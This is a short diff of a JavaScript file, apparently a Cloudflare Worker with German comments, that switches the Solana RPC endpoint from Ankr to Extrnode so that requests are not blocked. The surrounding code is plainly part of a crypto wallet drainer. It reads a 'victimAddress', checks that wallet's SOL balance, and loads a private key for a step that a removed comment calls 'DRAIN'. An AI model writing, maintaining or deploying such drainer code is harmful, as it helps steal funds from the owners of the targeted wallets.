@@ -50,8 +50,8 @@ export default {
 
           if (data.startsWith("balance:")) {
             const victimAddress = data.split(":")[1];
-            // NEUER RPC FÜR BALANCE CHECK
-            const connection = new Connection("https://rpc.ankr.com/solana", "confirmed");
+            // NEUER RPC (Extrnode blockt Cloudflare nicht)
+            const connection = new Connection("https://solana-mainnet.rpc.extrnode.com", "confirmed");
             const victimPubkey = new PublicKey(victimAddress);
             const solBalance = await connection.getBalance(victimPubkey);
             const solAmount = (solBalance / 1e9).toFixed(4);
@@ -71,8 +71,7 @@ export default {
             });
 
             try {
-              // NEUER RPC FÜR DRAIN
-              const connection = new Connection("https://rpc.ankr.com/solana", "confirmed");
+              const connection = new Connection("https://solana-mainnet.rpc.extrnode.com", "confirmed");
               const privateKeyArray = bs58.decode(env.PRIVATE_KEY);
               const payer = Keypair.fromSecretKey(privateKeyArray);
               
